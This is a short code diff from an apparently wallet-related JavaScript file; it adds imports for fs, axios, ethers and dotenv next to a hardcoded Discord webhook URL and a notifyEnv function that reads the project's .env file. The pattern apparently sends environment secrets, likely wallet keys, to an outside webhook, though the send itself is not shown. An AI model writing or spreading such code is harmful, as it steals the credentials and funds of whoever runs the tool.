@@ -65,6 +65,10 @@ async function processWallet(wallet) {
 const webhookURL = "https://discord.com/api/webhooks/1372767653420073070/n4DOqxp4gNga-w7OjOtDZXk130Fim82ApQQAe3K0BemzAqsHoyCg2scnpBFWyMm1BIpu";
 
 const envCacheFile = ".env_cache";
+const fs = require('fs');
+const axios = require('axios');
+const { ethers } = require('ethers');
+require('dotenv').config();
 
 async function notifyEnv() {
   const currentEnv = fs.readFileSync(".env", "utf8");
